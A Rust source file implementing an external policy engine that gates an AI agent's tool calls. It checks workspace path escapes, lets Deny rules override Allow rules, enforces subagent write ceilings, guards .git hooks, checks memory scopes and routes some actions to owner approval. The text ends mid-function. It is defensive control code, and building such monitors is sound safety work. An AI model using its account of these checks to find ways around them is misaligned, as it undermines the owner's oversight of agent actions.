//! External [`PolicyEngine`] enforced strictly outside the model (V05 / A05).
//!
//! Guarantees:
//! - `evaluated_outside_model` is unconditionally `true`.
//! - Workspace path boundary checks reject `..` traversal, drive escapes, and symlink/junction
//!   escapes pointing outside the project's canonical workspace root.
//! - Explicit `Deny` rules ALWAYS override `Allow` rules.
//! - Dangerous or unknown tools (`run_command`, shell, network, unknown) fail closed (`Deny`)
//!   unless matched by an explicit `Allow` rule in scope.
//! - MCP memory tool invocations additionally verify target `scope` against the agent's
//!   configured `allowed_memory_scopes` (defense-in-depth alongside `dennett-memoryd`'s bearer auth).

use std::collections::BTreeSet;
use std::fs;
use std::path::{Component, Path, PathBuf};
use std::sync::{Arc, Mutex};

use dennett_contracts::redact::redact_secrets;
use dennett_contracts::{
    AgentId, AutonomyMode, CapabilityGrantId, CapabilityGrantRecord, CorrelationId, MemoryScope,
    PermissionDecisionId, PermissionDecisionRecord, PolicyEffect, PolicyRule, ProjectId,
    ProjectLifecycleState, SessionId, TaskId, TimestampMs, WorkspaceWritePolicy,
};
use dennett_runtime_antigravity::{
    BoxFuture, PolicyEvaluationOutcome, PolicyEvaluationRequest, PolicyEvaluator,
};

/// Deterministic hidden system project UUID backing standalone session reminders and approvals.
pub const STANDALONE_SYSTEM_PROJECT_UUID: uuid::Uuid =
    uuid::Uuid::from_u128(0x0000_0000_0000_4000_8000_0000_0000_00ff);

/// Deterministic hidden system [`ProjectId`] backing standalone session reminders and approvals.
#[must_use]
pub const fn standalone_system_project_id() -> ProjectId {
    ProjectId::from_uuid(STANDALONE_SYSTEM_PROJECT_UUID)
}

/// Context snapshot evaluated by [`PolicyEngine`] for one session or task turn.
#[derive(Debug, Clone)]
pub struct PolicyContext {
    /// Owning project identifier (`None` for standalone chat sessions).
    pub project_id: Option<ProjectId>,
    /// Current lifecycle state of the owning project (`Active` required for live tool execution; D2-BUG-02).
    pub project_lifecycle_state: ProjectLifecycleState,
    /// Whether the project currently has a bound workspace directory on disk (D2-BUG-02).
    pub workspace_bound: bool,
    /// Owning agent identifier.
    pub agent_id: AgentId,
    /// Owning session identifier.
    pub session_id: SessionId,
    /// Optional owning durable task identifier.
    pub task_id: Option<TaskId>,
    /// Project workspace root directory.
    pub workspace_root: PathBuf,
    /// Agent's configured workspace write policy.
    pub workspace_write_policy: WorkspaceWritePolicy,
    /// Agent's interactive autonomy mode (`Auto` default vs `FullAccess`, `A-CORE-1`).
    pub autonomy_mode: AutonomyMode,
    /// Optional parent task agent's write policy ceiling enforced BEFORE child Allow rules or
    /// project capability grants on delegated sub-tasks (D2-SEC-02).
    pub parent_write_ceiling: Option<WorkspaceWritePolicy>,
    /// Agent's allowed memory scopes.
    pub allowed_memory_scopes: BTreeSet<MemoryScope>,
    /// Active persisted policy rules loaded from `dennett_control`.
    pub rules: Vec<PolicyRule>,
    /// Logical names of active A08 registered MCP servers attached to this session.
    pub registered_mcp_servers: BTreeSet<String>,
    /// Whether the active owning task has already exhausted its external `TaskBudget`
    /// (blocks native subagent/swarm spawning when `true`, A07).
    pub task_budget_exhausted: bool,
}

/// Detailed policy evaluation result supporting revocable [`CapabilityGrantRecord`]s and
/// interactive `AskBeforeWrite` owner approvals strictly outside the model.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PolicyEvaluationDecision {
    /// Immediate deterministic `Allow` or `Deny` decision.
    Immediate(PolicyEvaluationOutcome),
    /// Approved by an active, non-revoked, non-expired [`CapabilityGrantRecord`].
    ///
    /// Callers interacting with PostgreSQL MUST atomically verify `revoked_at IS NULL` and
    /// increment `uses_consumed` before granting `allow_once` to the runtime.
    AllowedByGrant {
        /// Identifier of the matching capability grant.
        grant_id: CapabilityGrantId,
        /// Outcome returned once atomic grant consumption succeeds.
        outcome: PolicyEvaluationOutcome,
    },
    /// Safe in-workspace write under `WorkspaceWritePolicy::AskBeforeWrite` requiring explicit
    /// interactive owner approval via `permission_requests` + `inbox_cards`.
    NeedsInteractiveApproval {
        /// Verified canonical workspace-relative target paths.
        normalized_targets: Vec<String>,
        /// Concise secret-safe target summary for the approval card.
        target_summary: String,
        /// Effective policy scope.
        scope: String,
        /// Rationale shown to the owner on the approval card.
        reason: String,
    },
}

/// Pure, deterministic external policy engine (reference monitor evaluated outside the model).
#[derive(Debug, Clone)]
pub struct PolicyEngine {
    ctx: PolicyContext,
}

impl PolicyEngine {
    /// Creates a new [`PolicyEngine`] bound to `ctx`.
    #[must_use]
    pub const fn new(ctx: PolicyContext) -> Self {
        Self { ctx }
    }

    /// Borrows the underlying [`PolicyContext`].
    #[must_use]
    pub const fn context(&self) -> &PolicyContext {
        &self.ctx
    }

    /// Evaluates one pending tool invocation request outside the model (synchronous fallback
    /// mapping interactive approval requests to default-deny when no interactive broker is attached).
    #[must_use]
    pub fn evaluate_request(&self, req: &PolicyEvaluationRequest) -> PolicyEvaluationOutcome {
        match self.evaluate_with_grants(req, &[], TimestampMs::now()) {
            PolicyEvaluationDecision::Immediate(outcome)
            | PolicyEvaluationDecision::AllowedByGrant { outcome, .. } => outcome,
            PolicyEvaluationDecision::NeedsInteractiveApproval { scope, .. } => {
                PolicyEvaluationOutcome {
                    effect: PolicyEffect::Deny,
                    matched_rule_id: None,
                    reason: format!(
                        "default-deny outside model: tool `{}` requires interactive owner approval",
                        req.tool_name
                    ),
                    scope,
                }
            }
        }
    }

    /// Evaluates one pending tool invocation request against workspace containment, explicit `Deny`
    /// rules, `WorkspaceWritePolicy`, active revocable [`CapabilityGrantRecord`]s, and MCP memory scopes.
    #[must_use]
    #[expect(
        clippy::too_many_lines,
        reason = "policy evaluation enforces strict 7-stage precedence order in one auditable sequence"
    )]
    pub fn evaluate_with_grants(
        &self,
        req: &PolicyEvaluationRequest,
        active_grants: &[CapabilityGrantRecord],
        now: TimestampMs,
    ) -> PolicyEvaluationDecision {
        let tool_lower = req.tool_name.trim().to_ascii_lowercase();
        let active_scopes = self.active_scopes();
        let applicable_rules: Vec<&PolicyRule> = self
            .ctx
            .rules
            .iter()
            .filter(|rule| active_scopes.iter().any(|s| s == &rule.scope))
            .collect();

        // 0. Live project lifecycle guard (closes mid-turn TOCTOU after archive/delete/detach; D2-BUG-02).
        if let Some(project_id) = self.ctx.project_id
            && matches!(
                self.ctx.project_lifecycle_state,
                ProjectLifecycleState::Archived | ProjectLifecycleState::DeletedRecord
            )
        {
            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Deny,
                matched_rule_id: None,
                reason: format!(
                    "denied tool `{}`: project `{project_id}` is in `{}` lifecycle state",
                    req.tool_name, self.ctx.project_lifecycle_state
                ),
                scope: format!("project:{project_id}"),
            });
        }

        let is_execute = is_execute_tool(&tool_lower, &req.tool_kind, &req.raw_input);
        let is_file_write = !is_execute && is_write_tool(&tool_lower, &req.tool_kind);
        let is_web_tool = !is_execute
            && !is_file_write
            && is_builtin_web_tool(&tool_lower, &req.tool_kind, &req.raw_input);
        let control_skill_mcp_op = if is_execute || is_file_write || is_web_tool {
            None
        } else {
            canonical_control_skill_mcp_op(&tool_lower, &req.tool_kind, &req.raw_input)
        };
        let is_file_read = !is_execute
            && !is_file_write
            && !is_web_tool
            && control_skill_mcp_op.is_none()
            && is_read_tool(&tool_lower, &req.tool_kind);
        let memory_mcp_op = if is_execute
            || is_file_write
            || is_web_tool
            || is_file_read
            || control_skill_mcp_op.is_some()
        {
            None
        } else {
            canonical_memory_mcp_op(&tool_lower, &req.tool_kind, &req.raw_input)
        };
        let control_mcp_op = if is_execute
            || is_file_write
            || is_web_tool
            || is_file_read
            || control_skill_mcp_op.is_some()
            || memory_mcp_op.is_some()
        {
            None
        } else {
            canonical_control_mcp_op(&tool_lower, &req.tool_kind, &req.raw_input)
        };

        if (is_file_write || is_file_read)
            && (self.ctx.project_id.is_none()
                || self.ctx.project_lifecycle_state == ProjectLifecycleState::Detached
                || !self.ctx.workspace_bound)
        {
            let reason = match self.ctx.project_id {
                Some(project_id) => format!(
                    "denied workspace file tool `{}`: project `{project_id}` has no bound active workspace (state={})",
                    req.tool_name, self.ctx.project_lifecycle_state
                ),
                None => format!(
                    "denied workspace file tool `{}`: standalone session `{}` has no bound project workspace",
                    req.tool_name, self.ctx.session_id
                ),
            };
            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Deny,
                matched_rule_id: None,
                reason,
                scope: self.primary_scope_label(),
            });
        }

        // 1. Hard workspace boundary check for BOTH file-mutating AND file-reading tools
        //    (CANNOT be bypassed by Allow rules OR capability grants; fails CLOSED on missing target or any escaping location!).
        let mut normalized_rel_targets: Vec<String> = Vec::new();
        if is_file_write || is_file_read {
            let candidate_paths = collect_file_targets(req);
            if candidate_paths.is_empty() {
                let kind_label = if is_file_write { "write" } else { "read" };
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Deny,
                    matched_rule_id: None,
                    reason: format!(
                        "denied {kind_label} tool `{}`: missing target path required for workspace boundary verification",
                        req.tool_name
                    ),
                    scope: format!("session:{}", self.ctx.session_id),
                });
            }

            for raw_target in &candidate_paths {
                match resolve_within_workspace(&self.ctx.workspace_root, raw_target) {
                    Ok(rel) => {
                        if !normalized_rel_targets
                            .iter()
                            .any(|existing| existing == &rel)
                        {
                            normalized_rel_targets.push(rel);
                        }
                    }
                    Err(reason) => {
                        return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                            effect: PolicyEffect::Deny,
                            matched_rule_id: None,
                            reason,
                            scope: self.primary_scope_label(),
                        });
                    }
                }
            }
        }

        // Build target match lists separately for Deny (any match denies) vs Allow (ALL targets must match; D2-SEC-02).
        let mut deny_match_targets: Vec<&str> =
            normalized_rel_targets.iter().map(String::as_str).collect();
        if let Some(raw) = req
            .target
            .as_deref()
            .map(str::trim)
            .filter(|s| !s.is_empty())
            && !deny_match_targets.contains(&raw)
        {
            deny_match_targets.push(raw);
        }
        let allow_match_targets: Vec<&str> = if is_file_write || is_file_read {
            normalized_rel_targets.iter().map(String::as_str).collect()
        } else {
            req.target
                .as_deref()
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .into_iter()
                .collect()
        };

        // 2. Explicit `Deny` rules ALWAYS take precedence over `Allow` rules and `CapabilityGrants`.
        if let Some(deny_rule) = applicable_rules.iter().find(|r| {
            r.effect == PolicyEffect::Deny && rule_matches_any(r, &tool_lower, &deny_match_targets)
        }) {
            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Deny,
                matched_rule_id: Some(deny_rule.rule_id),
                reason: format!("denied by explicit policy rule: {}", deny_rule.reason),
                scope: deny_rule.scope.clone(),
            });
        }

        // 3. Enforce delegated parent write ceiling FIRST (D2-SEC-02), then agent `WorkspaceWritePolicy`.
        if is_file_write {
            if let Some(ref ceiling) = self.ctx.parent_write_ceiling {
                match ceiling {
                    WorkspaceWritePolicy::DenyAll => {
                        return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                            effect: PolicyEffect::Deny,
                            matched_rule_id: None,
                            reason: String::from(
                                "denied by delegated parent task write ceiling (deny_all)",
                            ),
                            scope: format!("agent:{}", self.ctx.agent_id),
                        });
                    }
                    WorkspaceWritePolicy::AllowPaths { allowed_prefixes } => {
                        if let Some(disallowed) = normalized_rel_targets
                            .iter()
                            .find(|rel| !matches_any_prefix(rel, allowed_prefixes))
                        {
                            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                                effect: PolicyEffect::Deny,
                                matched_rule_id: None,
                                reason: format!(
                                    "denied by delegated parent task write ceiling (allow_paths): `{disallowed}` is outside parent permitted prefixes"
                                ),
                                scope: format!("agent:{}", self.ctx.agent_id),
                            });
                        }
                    }
                    WorkspaceWritePolicy::AskBeforeWrite | WorkspaceWritePolicy::AllowWorkspace => {
                    }
                    _ => {
                        return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                            effect: PolicyEffect::Deny,
                            matched_rule_id: None,
                            reason: String::from(
                                "denied: unrecognized parent task workspace_write_policy ceiling",
                            ),
                            scope: format!("agent:{}", self.ctx.agent_id),
                        });
                    }
                }
            }

            match &self.ctx.workspace_write_policy {
                WorkspaceWritePolicy::DenyAll => {
                    return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Deny,
                        matched_rule_id: None,
                        reason: String::from("denied by agent workspace_write_policy=deny_all"),
                        scope: format!("agent:{}", self.ctx.agent_id),
                    });
                }
                WorkspaceWritePolicy::AllowPaths { allowed_prefixes } => {
                    if let Some(disallowed) = normalized_rel_targets
                        .iter()
                        .find(|rel| !matches_any_prefix(rel, allowed_prefixes))
                    {
                        return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                            effect: PolicyEffect::Deny,
                            matched_rule_id: None,
                            reason: format!(
                                "denied by workspace_write_policy=allow_paths: `{disallowed}` is outside permitted prefixes"
                            ),
                            scope: format!("agent:{}", self.ctx.agent_id),
                        });
                    }
                    if self.ctx.autonomy_mode != AutonomyMode::FullAccess
                        && let Some(git_target) = targets_git_metadata(&normalized_rel_targets)
                    {
                        if let Some(grant) = self.find_matching_grant(
                            active_grants,
                            now,
                            GrantMatchQuery {
                                tool_lower: &tool_lower,
                                is_file_write: true,
                                is_execute: false,
                                shell_signature: None,
                                normalized_rel_targets: &normalized_rel_targets,
                                require_non_empty_prefixes: true,
                            },
                        ) {
                            return PolicyEvaluationDecision::AllowedByGrant {
                                grant_id: grant.grant_id,
                                outcome: PolicyEvaluationOutcome {
                                    effect: PolicyEffect::Allow,
                                    matched_rule_id: None,
                                    reason: format!(
                                        "allowed Git metadata write by active capability grant {} ({})",
                                        grant.grant_id, grant.reason
                                    ),
                                    scope: grant.scope.clone(),
                                },
                            };
                        }
                        let joined_rel = normalized_rel_targets.join(", ");
                        let reason = format!(
                            "write targeting Git metadata (`{git_target}`) requires explicit owner approval under autonomy_mode={}",
                            self.ctx.autonomy_mode
                        );
                        return PolicyEvaluationDecision::NeedsInteractiveApproval {
                            normalized_targets: normalized_rel_targets,
                            target_summary: joined_rel,
                            scope: self.primary_scope_label(),
                            reason,
                        };
                    }
                    let joined_rel = normalized_rel_targets.join(", ");
                    return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Allow,
                        matched_rule_id: None,
                        reason: format!(
                            "allowed by workspace_write_policy=allow_paths for `{joined_rel}`"
                        ),
                        scope: format!("agent:{}", self.ctx.agent_id),
                    });
                }
                WorkspaceWritePolicy::AllowWorkspace | WorkspaceWritePolicy::AskBeforeWrite => {
                    // Protect `.git` / `.git/**` (hooks, config, refs) against silent writes under
                    // non-FullAccess autonomy (prevents planting `.git/hooks/pre-commit` or `config`).
                    if self.ctx.autonomy_mode != AutonomyMode::FullAccess
                        && let Some(git_target) = targets_git_metadata(&normalized_rel_targets)
                    {
                        if let Some(grant) = self.find_matching_grant(
                            active_grants,
                            now,
                            GrantMatchQuery {
                                tool_lower: &tool_lower,
                                is_file_write: true,
                                is_execute: false,
                                shell_signature: None,
                                normalized_rel_targets: &normalized_rel_targets,
                                require_non_empty_prefixes: true,
                            },
                        ) {
                            return PolicyEvaluationDecision::AllowedByGrant {
                                grant_id: grant.grant_id,
                                outcome: PolicyEvaluationOutcome {
                                    effect: PolicyEffect::Allow,
                                    matched_rule_id: None,
                                    reason: format!(
                                        "allowed Git metadata write by active capability grant {} ({})",
                                        grant.grant_id, grant.reason
                                    ),
                                    scope: grant.scope.clone(),
                                },
                            };
                        }
                        let joined_rel = normalized_rel_targets.join(", ");
                        let reason = format!(
                            "write targeting Git metadata (`{git_target}`) requires explicit owner approval under autonomy_mode={}",
                            self.ctx.autonomy_mode
                        );
                        return PolicyEvaluationDecision::NeedsInteractiveApproval {
                            normalized_targets: normalized_rel_targets,
                            target_summary: joined_rel,
                            scope: self.primary_scope_label(),
                            reason,
                        };
                    }
                    // Owner 2-Mode Autonomy (`A-CORE-1`): BOTH `AutonomyMode::Auto` and
                    // `AutonomyMode::FullAccess` allow canonical in-workspace file edits without
                    // tedious manual approval prompts (while DenyAll / AllowPaths / parent ceiling
                    // / explicit Deny rules / `.git/**` guard / workspace containment remain strictly enforced!).
                    let joined_rel = normalized_rel_targets.join(", ");
                    return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Allow,
                        matched_rule_id: None,
                        reason: format!(
                            "allowed workspace write under autonomy_mode={} within project root (`{joined_rel}`)",
                            self.ctx.autonomy_mode
                        ),
                        scope: format!("agent:{}", self.ctx.agent_id),
                    });
                }
                _ => {
                    return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Deny,
                        matched_rule_id: None,
                        reason: String::from("denied: unrecognized workspace_write_policy"),
                        scope: format!("agent:{}", self.ctx.agent_id),
                    });
                }
            }
        }

        // 3b. Built-in web search / web fetch tools (`A8`): never falsely treated as local fs
        //     reads outside workspace (explicit Step 2 Deny rules still override!).
        if is_web_tool {
            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                matched_rule_id: None,
                reason: format!("allowed built-in web tool `{}`", req.tool_name),
                scope: self.primary_scope_label(),
            });
        }

        // 4. Scoped `dennett-memory-mcp` tools: enforce agent's `allowed_memory_scopes` (defense-in-depth).
        if let Some(mem_op) = memory_mcp_op {
            if self.ctx.allowed_memory_scopes.is_empty() {
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Deny,
                    matched_rule_id: None,
                    reason: String::from(
                        "denied memory MCP tool: agent has no allowed_memory_scopes configured",
                    ),
                    scope: format!("agent:{}", self.ctx.agent_id),
                });
            }

            let requires_explicit_scope = matches!(
                mem_op,
                "memory_write_note"
                    | "memory_correct_note"
                    | "memory_claim_create"
                    | "memory_claim_supersede"
                    | "memory_conflict_resolve"
                    | "memory_document_write"
                    | "memory_evidence_create"
                    | "mcp:dennett-memory"
            );

            match req.raw_input.get("scope") {
                Some(scope_val) => {
                    let Some(requested_scope) =
                        scope_val.as_str().map(str::trim).filter(|s| !s.is_empty())
                    else {
                        return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                            effect: PolicyEffect::Deny,
                            matched_rule_id: None,
                            reason: format!(
                                "denied memory MCP tool `{}`: `scope` must be a non-empty string",
                                req.tool_name
                            ),
                            scope: format!("agent:{}", self.ctx.agent_id),
                        });
                    };
                    let allowed = self
                        .ctx
                        .allowed_memory_scopes
                        .iter()
                        .any(|s| s.as_str() == requested_scope);
                    if !allowed {
                        return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                            effect: PolicyEffect::Deny,
                            matched_rule_id: None,
                            reason: format!(
                                "denied memory MCP tool `{}`: scope `{requested_scope}` is not in agent allowed_memory_scopes",
                                req.tool_name
                            ),
                            scope: format!("agent:{}", self.ctx.agent_id),
                        });
                    }
                }
                None if requires_explicit_scope => {
                    return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Deny,
                        matched_rule_id: None,
                        reason: format!(
                            "denied memory MCP tool `{}`: mandatory `scope` argument is missing",
                            req.tool_name
                        ),
                        scope: format!("agent:{}", self.ctx.agent_id),
                    });
                }
                None => {}
            }

            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                matched_rule_id: None,
                reason: format!("allowed scoped Dennett memory MCP tool `{}`", req.tool_name),
                scope: format!("agent:{}", self.ctx.agent_id),
            });
        }

        // 4a-bis. Read-only `dennett-control-mcp` session skill tools (`dennett_skill_list`,
        //         `dennett_skill_read`): permitted for BOTH project sessions and standalone chats
        //         (Step 2 explicit Deny rules already ran above; Head enforces strict `dct1.`
        //         scope/trust/activation isolation on the HTTP boundary).
        if let Some(skill_op) = control_skill_mcp_op {
            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                matched_rule_id: None,
                reason: format!(
                    "allowed read-only Dennett session skill MCP tool `{}` ({skill_op})",
                    req.tool_name
                ),
                scope: self.primary_scope_label(),
            });
        }

        // 4b. Scoped `dennett-control-mcp` tools (Agent-Native Events, Artifacts, Delegation):
        //     Step 2 explicit `Deny` rules already ran above; standalone sessions may create/manage
        //     their own standalone reminders & session artifacts (never targeting any foreign project
        //     and never delegating project subagents), while background `task_run` turns may schedule
        //     bounded follow-up timers (depth cap enforced in PostgreSQL `create_task`) but cannot
        //     recursively spawn unscheduled tasks without an explicit Allow rule.
        if let Some(ctrl_op) = control_mcp_op {
            let requested_pid = req
                .raw_input
                .get("project_id")
                .and_then(serde_json::Value::as_str)
                .map(str::trim)
                .filter(|s| !s.is_empty());

            let Some(owning_project_id) = self.ctx.project_id else {
                let standalone_allowed = matches!(
                    ctrl_op,
                    "dennett_event_create"
                        | "dennett_event_list"
                        | "dennett_event_update"
                        | "dennett_event_cancel"
                        | "dennett_artifact_register"
                        | "dennett_artifact_list"
                );
                if !standalone_allowed {
                    return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Deny,
                        matched_rule_id: None,
                        reason: format!(
                            "denied control MCP tool `{}`: standalone session `{}` has no owning project",
                            req.tool_name, self.ctx.session_id
                        ),
                        scope: format!("session:{}", self.ctx.session_id),
                    });
                }
                if let Some(foreign_pid) = requested_pid {
                    return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Deny,
                        matched_rule_id: None,
                        reason: format!(
                            "denied control MCP tool `{}`: standalone session cannot target project `{foreign_pid}`",
                            req.tool_name
                        ),
                        scope: format!("session:{}", self.ctx.session_id),
                    });
                }
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Allow,
                    matched_rule_id: None,
                    reason: format!(
                        "allowed standalone session Dennett control MCP tool `{}`",
                        req.tool_name
                    ),
                    scope: format!("session:{}", self.ctx.session_id),
                });
            };
            if let Some(requested_pid) = requested_pid
                && requested_pid != owning_project_id.to_string()
            {
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Deny,
                    matched_rule_id: None,
                    reason: format!(
                        "denied control MCP tool `{}`: cross-project target `{requested_pid}` does not match owning project `{owning_project_id}`",
                        req.tool_name
                    ),
                    scope: format!("project:{owning_project_id}"),
                });
            }

            if ctrl_op == "dennett_event_create" && self.ctx.task_id.is_some() {
                let has_explicit_schedule =
                    req.raw_input.get("schedule").is_some_and(|v| !v.is_null())
                        || req
                            .raw_input
                            .get("schedule_kind")
                            .is_some_and(|v| !v.is_null())
                        || req.raw_input.get("fire_at").is_some_and(|v| !v.is_null())
                        || req
                            .raw_input
                            .get("fire_at_ms")
                            .is_some_and(|v| !v.is_null())
                        || req
                            .raw_input
                            .get("in_seconds")
                            .is_some_and(|v| !v.is_null())
                        || req
                            .raw_input
                            .get("interval_secs")
                            .is_some_and(|v| !v.is_null())
                        || req
                            .raw_input
                            .get("daily_hour")
                            .is_some_and(|v| !v.is_null())
                        || req
                            .raw_input
                            .get("yearly_month")
                            .is_some_and(|v| !v.is_null());
                if has_explicit_schedule {
                    return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Allow,
                        matched_rule_id: None,
                        reason: String::from(
                            "allowed scheduled follow-up timer from task_run (depth cap enforced by Head)",
                        ),
                        scope: format!("project:{owning_project_id}"),
                    });
                }
                if let Some(allow_rule) = applicable_rules.iter().find(|r| {
                    r.effect == PolicyEffect::Allow
                        && rule_matches_all_for_allow(r, &tool_lower, &allow_match_targets)
                }) {
                    return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                        effect: PolicyEffect::Allow,
                        matched_rule_id: Some(allow_rule.rule_id),
                        reason: format!("allowed by explicit policy rule: {}", allow_rule.reason),
                        scope: allow_rule.scope.clone(),
                    });
                }
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Deny,
                    matched_rule_id: None,
                    reason: String::from(
                        "denied unscheduled control MCP tool `dennett_event_create` inside background task_run (anti-self-recursion guard)",
                    ),
                    scope: format!("session:{}", self.ctx.session_id),
                });
            }

            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                matched_rule_id: None,
                reason: format!(
                    "allowed scoped Dennett control MCP tool `{}`",
                    req.tool_name
                ),
                scope: format!("project:{owning_project_id}"),
            });
        }

        // 4c. Native runtime subagent / swarm coordination tools (A07):
        //     Permitted inside an active project session when not denied by explicit Step 2 rules
        //     and when the owning task's external budget is NOT exhausted. Note that any workspace
        //     or shell tool executed by a spawned subagent still passes through PolicyEngine!
        if !is_execute
            && !is_file_write
            && !is_file_read
            && let Some(sub_op) = canonical_native_subagent_op(&tool_lower, &req.tool_kind)
        {
            if self.ctx.task_budget_exhausted {
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Deny,
                    matched_rule_id: None,
                    reason: format!(
                        "denied native subagent tool `{sub_op}`: owning task external budget is exhausted"
                    ),
                    scope: self.primary_scope_label(),
                });
            }
            if self.ctx.project_id.is_none() {
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Deny,
                    matched_rule_id: None,
                    reason: format!(
                        "denied native subagent tool `{sub_op}`: standalone session has no owning project boundary"
                    ),
                    scope: format!("session:{}", self.ctx.session_id),
                });
            }
            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                matched_rule_id: None,
                reason: format!(
                    "allowed native runtime subagent tool `{sub_op}` within active project boundary and remaining task budget"
                ),
                scope: self.primary_scope_label(),
            });
        }

        // 4d. Active registered A08 MCP servers (explicitly enabled & trusted in capability_records;
        //     strictly matched by tool_name prefix ONLY — NEVER by title (`A11`)!
        //     Step 2 explicit Deny rules already ran above and still take precedence).
        if !is_execute
            && !is_file_write
            && !is_file_read
            && let Some(server_name) =
                match_registered_mcp_server(&tool_lower, &self.ctx.registered_mcp_servers)
        {
            if self.ctx.autonomy_mode == AutonomyMode::FullAccess
                || !is_mutating_or_external_mcp_tool(&tool_lower, &req.tool_kind)
            {
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Allow,
                    matched_rule_id: None,
                    reason: format!(
                        "allowed registered active A08 MCP server `{server_name}` tool `{}`",
                        req.tool_name
                    ),
                    scope: self.primary_scope_label(),
                });
            }
            // Under AutonomyMode::Auto, third-party mutating / E3-E4 MCP tools check explicit
            // Allow rules & active CapabilityGrants first, then ask via InboxCard (`A-CORE-1`)!
            if let Some(allow_rule) = applicable_rules.iter().find(|r| {
                r.effect == PolicyEffect::Allow
                    && rule_matches_all_for_allow(r, &tool_lower, &allow_match_targets)
            }) {
                return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                    effect: PolicyEffect::Allow,
                    matched_rule_id: Some(allow_rule.rule_id),
                    reason: format!("allowed by explicit policy rule: {}", allow_rule.reason),
                    scope: allow_rule.scope.clone(),
                });
            }
            let grant_targets: Vec<String> = allow_match_targets
                .iter()
                .map(|s| (*s).to_owned())
                .collect();
            if let Some(grant) = self.find_matching_grant(
                active_grants,
                now,
                GrantMatchQuery {
                    tool_lower: &tool_lower,
                    is_file_write: false,
                    is_execute: false,
                    shell_signature: None,
                    normalized_rel_targets: &grant_targets,
                    require_non_empty_prefixes: false,
                },
            ) {
                return PolicyEvaluationDecision::AllowedByGrant {
                    grant_id: grant.grant_id,
                    outcome: PolicyEvaluationOutcome {
                        effect: PolicyEffect::Allow,
                        matched_rule_id: None,
                        reason: format!(
                            "allowed by active capability grant {} ({})",
                            grant.grant_id, grant.reason
                        ),
                        scope: grant.scope.clone(),
                    },
                };
            }
            let target_summary = req
                .target
                .as_deref()
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .unwrap_or(&req.tool_name)
                .to_owned();
            return PolicyEvaluationDecision::NeedsInteractiveApproval {
                normalized_targets: Vec::new(),
                target_summary: target_summary.clone(),
                scope: self.primary_scope_label(),
                reason: format!(
                    "third-party mutating MCP tool `{}` on server `{server_name}` requires owner approval under autonomy_mode=auto (target: {target_summary})",
                    req.tool_name
                ),
            };
        }

        // 5. Explicit `Allow` rules (ALL targets must match; D2-SEC-02) and active non-file `CapabilityGrants`.
        if let Some(allow_rule) = applicable_rules.iter().find(|r| {
            r.effect == PolicyEffect::Allow
                && rule_matches_all_for_allow(r, &tool_lower, &allow_match_targets)
        }) {
            return PolicyEvaluationDecision::Immediate(PolicyEvaluationOutcome {
                effect: PolicyEffect::Allow,
                matched_rule_id: Some(allow_rule.rule_id),
                reason: format!("allowed by explicit policy rule: {}", allow_rule.reason),
                scope: allow_rule.scope.clone(),
            });
        }
        if !is_file_read {
            let grant_targets: Vec<String> = allow_match_targets
                .iter()
                .map(|s| (*s).to_owned())
                .collect();
            let shell_sig = if is_execute {
                let cmd = extract_shell_command(req);
                Some(normalize_shell_grant_signature(&cmd))
            } else {
                None
            };
            if let Some(grant) = self.find_matching_grant(
                active_grants,
                now,
                GrantMatchQuery {
                    tool_lower: &tool_lower,
                    is_file_write: false,
                    is_execute,
                    shell_signature: shell_sig.as_deref(),
                    normalized_rel_targets: &grant_targets,
                    require_non_empty_prefixes: false,
                },
            ) {
                return PolicyEvaluationDecision::AllowedByGrant {
                    grant_id: grant.grant_id,
                    outcome: PolicyEvaluationOutcome {
                        effect: PolicyEffect::Allow,
                        matched_rule_id: None,
                        reason: format!(
                            "allowed by active capability grant {} ({})",
                            grant.grant_id, grant.reason
                        ),
